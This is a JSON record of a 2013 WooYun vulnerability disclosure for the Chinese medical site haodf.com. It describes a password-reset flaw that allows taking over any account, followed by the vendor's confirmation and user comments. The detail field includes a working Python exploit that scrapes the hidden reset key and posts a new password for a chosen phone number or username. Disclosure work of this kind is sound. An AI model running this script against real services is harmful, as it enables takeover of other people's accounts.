{"id": 13961, "wybug_id": "wooyun-2013-018136", "wybug_title": "好大夫重置任意用户，附EXP", "wybug_corp": "好大夫在线", "wybug_author": "fox", "wybug_date": "2013-01-31 00:05", "wybug_open_date": "2013-03-17 00:06", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-17：\t细节向公众公开  简要描述： 礼物求给力 详细说明：  1、通过手机号重置\nhttp://passport.haodf.com/user/resetpassword\n通过此网址，可用邮箱或手机号找回密码当我们选择手机号找密码时，网页跳转到如下地址，要求输入用户名和手机验证码\nhttp://passport.haodf.com/user/sendpasswordsucc?type=mobile&username=xxxxxxx\n可以看出，这时用户名会直接出现在网页地址栏内，且验证码可以绕过（BTW，手机验证码可以反复使用， 似乎在很长一段时间内都不会过期）查看网页源代码，找到\n<input name=\"key\" type=\"hidden\" id=\"key\" value=\"DE4rXvQaMCGXBC3UMxQRXXXXXXXXNCEnO8iGq8jhOf0b\" />\n这个key就是用来重置密码的key然后构造一个post请求，地址为\nhttp://passport.haodf.com/user/confirmpassword\n数据为\npassword=123123&confirmPassword=123123&key=XXXXXX\n即可重置该用户密码2、通过用户名重置网址本身没用提供此功能， 但可以从上面的中间网址进入，即可通过用户名重置\nhttp://passport.haodf.com/user/sendpasswordsucc?type=mobile&username=xxxxxxx\n3、通过邮箱重置类似1中通过手机号重置   漏洞证明：  附一个python写的简单EXP\n#encoding=utf8username = 'init'class MyHTTPRedirectHandler(urllib2.HTTPRedirectHandler):    def http_error_302(self, req, fp, code, msg, httpmsg):        for header in httpmsg.headers:                    if header.count('username=') > 0:                global username                username = header[header.index('username=')+9: header.index('\\r\\n')]        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, httpmsg)import urllib, urllib2, ConfigParser, time, winsounddef ResetByPhone(phone):    resetpwd_url = 'http://passport.haodf.com/user/resetpassword'    submit_url = 'http://passport.haodf.com/user/confirmpassword'    req = urllib2.Request(resetpwd_url, 'input=%s' % phone)    opener = urllib2.build_opener(MyHTTPRedirectHandler)    response = opener.open(req)    the_page = response.read()    key = the_page[ the_page.index('id=\"key\"')+16 : ]    key = key[: key.index('\"')]    req = urllib2.Request(submit_url, 'password=%s&confirmPassword=%s&key=%s' % (phone,phone,key))    response = urllib2.urlopen(req)    #print response.read()def ResetByUsername(uname):    resetpwd_url = 'http://passport.haodf.com/user/sendpasswordsucc'    submit_url = 'http://passport.haodf.com/user/confirmpassword'    req = urllib2.Request(resetpwd_url, 'type=mobile&username=%s' % uname)    response = urllib2.urlopen(req)    the_page = response.read()    key = the_page[ the_page.index('id=\"key\"')+16 : ]    key = key[: key.index('\"')]    req = urllib2.Request(submit_url, 'password=%s&confirmPassword=%s&key=%s' % (uname,uname,key))    response = urllib2.urlopen(req)    #print response.read()ResetByPhone('13912341234')ResetByUsername('testuser')\n\n\n\n\n   修复方案：  把key隐藏设置验证码失效机制   版权声明：转载请注明来源 fox@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-01-31 11:47 厂商回复： 和之前重置密码的漏洞类似，不过不是同一个点，我们正在改，不过还是鼓励，毕竟是独立发现的问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-31 09:29 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  不会是重复的吧，    \n     2013-01-31 09:34 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  还有EXP？好东西！！    \n     2013-01-31 09:37 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @疯子 哈哈，有可能就是一条简单的URL哟~    \n     2013-01-31 11:41 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  之前有一个  WooYun: 我是如何重置好大夫任意用户密码的 不知道是不是重复的，看厂商怎么说吧    \n     2013-01-31 12:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @fox 亮点再带exp    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}